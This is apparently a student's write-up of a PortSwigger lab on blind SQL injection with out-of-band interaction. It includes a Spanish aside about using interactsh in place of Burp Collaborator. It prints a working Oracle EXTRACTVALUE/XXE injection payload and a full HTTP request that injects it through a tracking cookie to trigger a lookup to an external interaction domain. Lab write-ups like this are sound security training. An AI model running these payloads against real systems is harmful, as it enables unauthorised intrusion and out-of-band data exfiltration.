# Lab: Blind SQL injection with out-of-band interaction

PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

### No podemos usar el bursuite pro entonces usamos esta web  para hace rla funcion del collaborator
```r
https://app.interactsh.com/
```

```r
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

```r
GET / HTTP/2
Host: 0a63002804c8f51681f520c000430031.web-security-academy.net

Cookie: TrackingId=eMgdLfUwDvSfDkLl' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "zysgoyczrtwkjwjdgfacf2ie13m2wgvco.oast.fun"> %25remote%3b]>'),'/l') FROM dual-- -; session=ZCxMbU0BViE5GKrPZ93mDGQkRhzWmvK6

Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-Gpc: 1
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.6
Priority: u=0, i
Content-Length: 1

 
```



![[class16.png]]